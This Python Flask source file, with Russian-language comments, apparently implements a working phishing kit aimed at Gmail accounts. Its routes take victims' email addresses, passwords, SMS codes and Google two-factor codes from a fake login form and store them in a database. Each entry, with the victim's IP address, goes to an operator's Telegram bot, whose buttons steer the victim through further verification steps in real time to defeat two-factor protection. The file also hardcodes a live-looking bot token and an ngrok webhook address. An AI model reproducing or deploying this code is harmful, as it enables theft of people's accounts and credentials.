from flask import Flask, request, session, render_template, redirect, url_for, jsonify
from flask_mysqldb import MySQL
import requests
import uuid
import os
import re

app = Flask(__name__)
app.secret_key = os.urandom(24)
global global_last_code_id
global_last_code_id = "None"
# initialization BD 

app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = ''
app.config['MYSQL_DB'] = 'test_proj'

mysql = MySQL(app)

# Здесь укажите ваш токен от Telegram Bot API
bot_token = '6747733709:AAHmI_2gEydmnnI7ocZxxU8jAwUCJZBjNsk'

#WEB SIDE

def get_valid_code():
    cur = mysql.connection.cursor()
    sql_query = "SELECT `code` FROM `codes` WHERE `id` = %s"
    cur.execute(sql_query, (global_last_code_id,))
    res = cur.fetchall()
    cur.close()
    return res

@app.route('/check_is_accepted', methods=['GET'])
def check_is_accepted():
    cur = mysql.connection.cursor()
    sql_query = "SELECT `is_accepted` FROM `data` WHERE `id` = %s"
    cur.execute(sql_query, (global_last_id,))
    res = cur.fetchall()
    cur.close()
    return jsonify(res)
@app.route('/check_is_accepted_sms', methods=['GET'])
def check_is_accepted_sms():
    cur = mysql.connection.cursor()
    sql_query = "SELECT `is_accepted` FROM `sms` WHERE `id` = %s"
    cur.execute(sql_query, (global_last_sms,))
    res = cur.fetchall()
    cur.close()
    return jsonify(res)
@app.route('/check_is_accepted_google', methods=['GET'])
def check_is_accepted_google():
    cur = mysql.connection.cursor()
    sql_query = "SELECT `is_accepted` FROM `gauth` WHERE `id` = %s"
    cur.execute(sql_query, (global_last_gcode,))
    res = cur.fetchall()
    cur.close()
    return jsonify(res)
@app.route('/check_is_accepted_device', methods=['GET'])
def check_is_accepted_device():
        global global_last_code_id
        cur = mysql.connection.cursor()
        sql_query = "SELECT `is_accepted` FROM `codes` WHERE `id` = %s"
        cur.execute(sql_query, (global_last_code_id,))
        res = cur.fetchall()
        if res == "No":
            global_last_code_id = "None"
        cur.close()
        return jsonify(res)
@app.route('/getcode', methods=['GET'])
def getcode():
    global global_last_code_id
    if global_last_code_id != "None":
        res = get_valid_code()
        return jsonify(res)
    else:
        return "None"

def redirect_function():
    return redirect(url_for('another'))
@app.route('/')
def index():
    return render_template('form.html')
@app.route('/2fa')
def select():
    return render_template('select.html')


@app.route('/submit', methods=['POST'])
def submit():
    if request.method == 'POST':
        user_ip = request.remote_addr
        email = request.form['email']
        password = request.form['password']

        cur = mysql.connection.cursor()
        cur.execute("INSERT INTO data (email, password) VALUES (%s, %s)", (f'{email}', f'{password}'))
        global global_last_id
        last_id = cur.lastrowid
        global_last_id = last_id
        # проврека ид print(global_last_id) 
        mysql.connection.commit()
        cur.close()
        
        message = f"⚡️Новая почта - Юзер заполнил форму... \n Уникальный ид: {last_id}\n IP: {user_ip}\n Email: {email}\n Пароль: {password}"
        send_message_with_inline_buttons(global_chat_id, message) 
        return 'Data inserted successfully'
   

@app.route('/smssubmit', methods=['POST'])
def smssubmit():
    if request.method == 'POST':
        user_ip = request.remote_addr
        sms = request.form['sms']
        cur = mysql.connection.cursor()
        sql_query = "SELECT * FROM `data` WHERE `id` = %s"
        cur.execute(sql_query, (global_last_id,))
        res = cur.fetchall()
        mysql.connection.commit()
        cur.execute("INSERT INTO sms (sms) VALUES (%s)", (f'{sms}',))
        global global_last_sms
        last_sms = cur.lastrowid
        global_last_sms = last_sms
        mysql.connection.commit()
        cur.close()
        print(res)
        message = f"⚡️Почта с СМС-Кодом - Юзер заполнил форму... \n Уникальный ид: {global_last_id}\n IP: {user_ip}\n Email: {res[0][1]}\n Пароль: {res[0][2]}\n SMS: {sms}"
        send_message_with_inline_buttons_sms(global_chat_id, message) 
        return "good"   

@app.route('/gcode', methods=['POST'])
def gcode():
    if request.method == 'POST':
        user_ip = request.remote_addr
        gcode = request.form['gcode']
        cur = mysql.connection.cursor()
        sql_query = "SELECT * FROM `data` WHERE `id` = %s"
        cur.execute(sql_query, (global_last_id,))
        res = cur.fetchall()
        mysql.connection.commit()
        cur.execute("INSERT INTO gauth (gcode) VALUES (%s)", (f'{gcode}',))
        global global_last_gcode
        last_gcode = cur.lastrowid
        global_last_gcode = last_gcode
        mysql.connection.commit()
        cur.close()
        message = f"⚡️Почта с Google-Кодом - Юзер заполнил форму... \n Уникальный ид: {global_last_id}\n IP: {user_ip}\n Email: {res[0][1]}\n Пароль: {res[0][2]}\n G-Code: {gcode}"
        send_message_with_inline_buttons_google(global_chat_id, message) 
        return "good"

@app.route('/device', methods=['POST'])
def device():
    if request.method == 'POST':
        message = f"❗️Юзер выбрал подтверждение через код с девайса.. \n Введите двухзначное число строго следуя следующему формату❗️❗️❗️ \"Код: **\" \n При успешном вводе вы получите сообщение, а также этот код получит юзер"
        send_message_to_bot(global_chat_id, message) 
        return 'Data inserted successfully'   

@app.route('/gmail')
def another():
    return render_template('Gmail.html')

    

#BOT FUNCS


# Функция для извлечения числа из текста
def extract_number_from_text(text):
    match = re.search(r'Код: (\d{2})', text)  # Поиск числа после фразы "Код: " (двухзначное число)
    if match:
        number = match.group(1)  # Получаем найденное число
        return int(number)
    return None

def edit_message_text(chat_id, text, message_id):
    edit_message_url = f'https://api.telegram.org/bot{bot_token}/editMessageText'
    payload = {
        'chat_id': chat_id,
        'message_id': message_id,  # Замените на реальный message_id, который нужно обновить
        'text': text
    }
    response = requests.post(edit_message_url, json=payload)
    print(response.json())

def send_message_with_inline_buttons(chat_id, message):
    message_text = message
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "Да✅", "callback_data": "yes"},
                {"text": "Нет❌", "callback_data": "no"},
                {"text": "2FA📱", "callback_data": "2fa"}
                
            ]
        ]
    }

    send_message_url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    payload = {
        'chat_id': chat_id,
        'text': message_text,
        'reply_markup': keyboard,
        'parse_mode': 'HTML'
    }
    response = requests.post(send_message_url, json=payload)
    print(response.json())

def send_message_with_inline_buttons_sms(chat_id, message):
    message_text = message
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "Да✅", "callback_data": "yessms"},
                {"text": "Нет❌", "callback_data": "nosms"}
                
            ]
        ]
    }

    send_message_url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    payload = {
        'chat_id': chat_id,
        'text': message_text,
        'reply_markup': keyboard,
        'parse_mode': 'HTML'
    }
    response = requests.post(send_message_url, json=payload)
    print(response.json())

def send_message_with_inline_buttons_google(chat_id, message):
    message_text = message
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "Да✅", "callback_data": "yesg"},
                {"text": "Нет❌", "callback_data": "nog"}
                
            ]
        ]
    }

    send_message_url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    payload = {
        'chat_id': chat_id,
        'text': message_text,
        'reply_markup': keyboard,
        'parse_mode': 'HTML'
    }
    response = requests.post(send_message_url, json=payload)
    print(response.json())

def send_message_with_inline_buttons_device(chat_id, message):
    message_text = message
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "Да✅", "callback_data": "yesdev"},
                {"text": "Нет❌", "callback_data": "nodev"}
                
            ]
        ]
    }

    send_message_url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    payload = {
        'chat_id': chat_id,
        'text': message_text,
        'reply_markup': keyboard,
        'parse_mode': 'HTML'
    }
    response = requests.post(send_message_url, json=payload)
    print(response.json())
    

def send_message_to_bot(chat_id, text):
    send_message_url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    payload = {
        'chat_id': chat_id,
        'text': text
    }
    response = requests.post(send_message_url, json=payload)
    print(response.json())
#WEBHOOK SIDE
@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    # print(data)
    callback_data = data.get('callback_query', {}).get('data')
    if 'callback_query' in data:
        message_id = data['callback_query']['message']['message_id']
        chat_id = data['callback_query']['message']['chat']['id']
        if callback_data == 'yes':
            cur = mysql.connection.cursor()
            sql_query = "UPDATE data SET is_accepted = 'Yes' WHERE id = %s"
            cur.execute(sql_query, (global_last_id,))
            mysql.connection.commit()
            cur.close()
            response_text = 'Успешно вошли✅'
            edit_message_text(chat_id, response_text, message_id)
            return 'good'
            # print(response_text)
        if callback_data == 'no':
            cur = mysql.connection.cursor()
            sql_query = "UPDATE data SET is_accepted = 'No' WHERE id = %s"
            cur.execute(sql_query, (global_last_id,))
            mysql.connection.commit()
            cur.close()
            response_text = 'Ждём новую отправку..'
            edit_message_text(chat_id, response_text, message_id)
            return 'good'
            # print(response_text)
        if callback_data == '2fa':
            cur = mysql.connection.cursor()
            sql_query = "UPDATE data SET is_accepted = '2fa' WHERE id = %s"
            cur.execute(sql_query, (global_last_id,))
            mysql.connection.commit()
            cur.close()
            response_text = 'Перевели на двухфакторку, ожидаем выбора подтверждения..'
            edit_message_text(chat_id, response_text, message_id)
        if callback_data == 'yessms':
            cur = mysql.connection.cursor()
            sql_query = "UPDATE sms SET is_accepted = 'Yes' WHERE id = %s"
            cur.execute(sql_query, (global_last_sms,))
            mysql.connection.commit()
            cur.close()
            response_text = 'Успешно вошли✅'
            edit_message_text(chat_id, response_text, message_id)
            return 'good'
            # print(response_text)
        if callback_data == 'nosms':
            cur = mysql.connection.cursor()
            sql_query = "UPDATE sms SET is_accepted = 'No' WHERE id = %s"
            cur.execute(sql_query, (global_last_sms,))
            mysql.connection.commit()
            cur.close()
            response_text = 'Ждём новую отправку..'
            edit_message_text(chat_id, response_text, message_id)
            return 'good'
        if callback_data == 'yesg':
            cur = mysql.connection.cursor()
            sql_query = "UPDATE gauth SET is_accepted = 'Yes' WHERE id = %s"
            cur.execute(sql_query, (global_last_gcode,))
            mysql.connection.commit()
            cur.close()
            response_text = 'Успешно вошли✅'
            edit_message_text(chat_id, response_text, message_id)
            return 'good'
            # print(response_text)
        if callback_data == 'nog':
            cur = mysql.connection.cursor()
            sql_query = "UPDATE gauth SET is_accepted = 'No' WHERE id = %s"
            cur.execute(sql_query, (global_last_gcode,))
            mysql.connection.commit()
            cur.close()
            response_text = 'Ждём новую отправку..'
            edit_message_text(chat_id, response_text, message_id)
            return 'good'
            # print(response_text)
        if callback_data == 'yesdev':
            global global_last_code_id
            cur = mysql.connection.cursor()
            sql_query = "UPDATE codes SET is_accepted = 'Yes' WHERE id = %s"
            cur.execute(sql_query, (global_last_code_id,))
            mysql.connection.commit()
            cur.close()
            response_text = 'Успешно вошли✅'
            edit_message_text(chat_id, response_text, message_id)
            return 'good'
            # print(response_text)
        if callback_data == 'nodev':
            

            cur = mysql.connection.cursor()
            sql_query = "UPDATE codes SET is_accepted = 'No' WHERE id = %s"
            cur.execute(sql_query, (global_last_code_id,))
            mysql.connection.commit()
            cur.close()
            response_text = 'Введите новый код (Код: **)..'
            edit_message_text(chat_id, response_text, message_id)
            return 'good'
            # print(response_text)
    if 'message' in data:
        chat_id = data['message']['chat']['id']
        text = data['message'].get('text')
        # Если текст начинается с 'Код: ' и содержит двухзначное число
        if text and text.startswith('Код: '):
            number = extract_number_from_text(text)
            print(number)
            if number is not None:
                # Вставка числа в базу данных
                cur = mysql.connection.cursor()
                cur.execute("INSERT INTO codes (code) VALUES (%s)", (number,))
                last_code = cur.lastrowid                
                global_last_code_id = last_code
                mysql.connection.commit()
                cur.close()
                response_text = f'Код {number} успешно отправлен! Подождите немного пока пользователь нажмёт кнопку'
                send_message_with_inline_buttons_device(chat_id, response_text)
        if text == '/start':
            return start()
    return '', 200

@app.route('/start', methods=['POST'])
def start():
    global global_chat_id

    data = request.get_json()
    if 'message' in data:
        chat_id = data['message']['chat']['id']
        global_chat_id = chat_id
        message = 'Привет👋\nбот успешно запущен, ожидай заполнения веб-формы \nКак только кто-то заполнит форму - ты получишь сообщение..'
        send_message_to_bot(chat_id, message)

    return '', 200

def set_webhook():
    # Здесь указывается URL, предоставляемый Ngrok
    ngrok_url = 'https://ca76-46-223-3-197.ngrok.io'
    bot_api_url = f'https://api.telegram.org/bot{bot_token}/setWebhook?url={ngrok_url}/webhook'
    response = requests.get(bot_api_url)
    # print(response.json())
    
if __name__ == '__main__':
    set_webhook()  # Установка вебхука при запуске приложения
    app.run()
